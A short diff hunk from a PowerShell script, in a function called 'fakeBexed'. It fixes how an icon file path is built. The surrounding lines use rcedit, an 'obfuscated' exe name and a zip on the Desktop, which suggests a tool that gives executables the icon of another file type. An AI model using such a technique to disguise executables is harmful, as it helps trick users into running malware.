@@ -88,7 +88,7 @@ function fakeBexed {
     }
     
     $ExeRcEdit=(-join($rceditInstallDir,'\','exe','\','rcedit-x64.exe'))
-    $IconsDir=(-join($rceditInstallDir,'\','icons','\',"$fext.ico"))
+    $IconsDir=(-join($rceditInstallDir,'\','icons','\',"$fext",'.ico'))
     $TmpExeEdit=(-join($env:temp,'\',"$exeObf"))
     $TmpExeFext=(-join($env:temp,'\',"Ann*",'.exe'))
     $zipFileName=(-join($env:USERPROFILE,'\','Desktop','\',"$zipName", '.zip'))
